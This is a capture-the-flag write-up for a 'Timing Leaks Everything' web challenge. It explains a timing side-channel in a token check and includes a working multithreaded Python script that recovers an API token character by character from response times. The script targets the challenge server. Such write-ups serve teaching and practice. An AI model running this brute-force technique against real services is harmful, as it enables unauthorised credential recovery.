---
title: HAC CTF 2025 Timing Leaks Everything
draft: false
tags:
  - ctf
  - web-exploitation
  - timing-attack
---
# Timing Leaks Everything

> There's a website that requires an API token for using its service. Unfortunately, you don't have one of these fancy API tokens. Using the power of time, can you discover one? Hint: The character set of the token is limited to the following: "abcdefghijklmnopqrstuvwxyz0123456789-_"

This challenge is a time-based blind attack, where we need to slowly craft the token. I assume the backend is doing something like:

```python
token = "some-secret-token"
user_token = input()

for i in range(len(user_token))
	if (user_token[i] == token[i]):
		time.sleep(0.25)
	else:
		print("Invalid token!")
```

This allows us to basically bruteforce the token, character-by-character, by analyzing response time. I had Claude 3.5 generate a Python script to do this for me:

```python

def time_leak_attack(base_url, charset, max_length=32, attempts_per_char=5, threads=6, min_gap_ratio=0.15):
    token = ''
    print(f"Starting timing attack on {base_url}")
    for pos in range(max_length):
        while True:
            timings = []
            all_samples = {}
            def test_char(c):
                guess = token + c
                samples = []
                for _ in range(attempts_per_char):
                    start = time.time()
                    r = requests.post(base_url, data={'token': guess})
                    elapsed = time.time() - start
                    samples.append(elapsed)
                # Remove highest and lowest if enough samples
                if len(samples) > 3:
                    samples.sort()
                    samples = samples[1:-1]
                median = statistics.median(samples)
                return (c, median, samples)
            with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
                future_to_char = {executor.submit(test_char, c): c for c in charset}
                for future in concurrent.futures.as_completed(future_to_char):
                    c, median, samples = future.result()
                    timings.append((c, median))
                    all_samples[c] = samples
            # Sort by median, print top 3
            timings.sort(key=lambda x: x[1], reverse=True)
            print(f"\n[Pos {pos+1}] Top 3 candidates:")
            for c, med in timings[:3]:
                print(f"  '{c}': median={med:.4f}s, samples={all_samples[c]}")
            best_char, best_median = timings[0]
            second_median = timings[1][1] if len(timings) > 1 else 0
            # Require a significant gap
            if best_median > 0 and (best_median - second_median) / best_median >= min_gap_ratio:
                token += best_char
                print(f"[+] Token so far: {token}")
                # Optional: check for success
                r = requests.get(base_url+"/flag?token="+token)
                if r.status_code != 403:
                    print(f"[+] Success! Token: {token}")
                    return
                break
            else:
                print(f"[!] Gap too small ({best_median:.4f}s vs {second_median:.4f}s), repeating round...")
    print(f"Final token guess: {token}")

time_leak_attack(
    base_url='https://time-leaks-everything.chals.ctf.malteksolutions.com/',
    charset="abcdefghijklmnopqrstuvwxyz0123456789-_",
    max_length=32,
    attempts_per_char=5,
    threads=6,
    min_gap_ratio=0.02
)

#  ak-t1m3-t0k3n
```

The tl;dr of this script is:

1. Enumerate through all the characters at position x, 5 times each. 
2. Calculate top 3 characters based on median sample (response time)
3. Calculate most likely character for position x if >=2% of the other characters
4. Submit the token to the flag checker, and if it fails, repeat for next position

We do it this way because there is going to be a lot of traffic going to this endpoint from other users, which can cause unreliable response times. By sampling 5 times, we help reduce outliers and get reliable scores. We use a gap ratio to ensure it's statistically significant, and if not, we repeat the test. 